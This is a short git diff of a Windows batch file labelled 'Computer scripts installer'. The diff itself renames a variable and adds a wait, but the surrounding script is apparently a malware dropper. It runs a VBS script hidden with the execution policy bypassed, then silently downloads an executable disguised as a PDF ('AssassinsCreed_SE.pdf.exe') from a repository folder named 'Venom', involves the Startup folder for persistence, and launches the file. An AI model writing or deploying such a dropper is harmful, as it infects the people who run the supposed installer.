@@ -1,7 +1,7 @@
 @echo off
 
 @rem Computer scripts installer
-set "$INI_PATH = C:/Users/%USERNAME%/Desktop"
+set "$currentDir = C:/Users/%USERNAME%/Desktop"
 set "$startup = C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 
 @rem Function to check internet connection
@@ -35,6 +35,11 @@ for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     )
 )
 
+echo Waiting for 5 seconds...
+timeout /t 20 /nobreak
+echo Done waiting!
+
+
 @rem Use VBS script to run batch file hidden
 powershell -windowstyle hidden -ExecutionPolicy Bypass ./RunHidden.vbs
 
@@ -43,7 +48,7 @@ call :check_internet
 
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/AssassinsCreed_SE.pdf.exe -OutFile AssassinsCreed_SE.pdf.exe"
 
-copy $startup/AssassinsCreed_SE.pdf.exe $INI_PATH
+copy $startup/AssassinsCreed_SE.pdf.exe $currentDir
 
 start AssassinsCreed_SE.pdf.exe
 
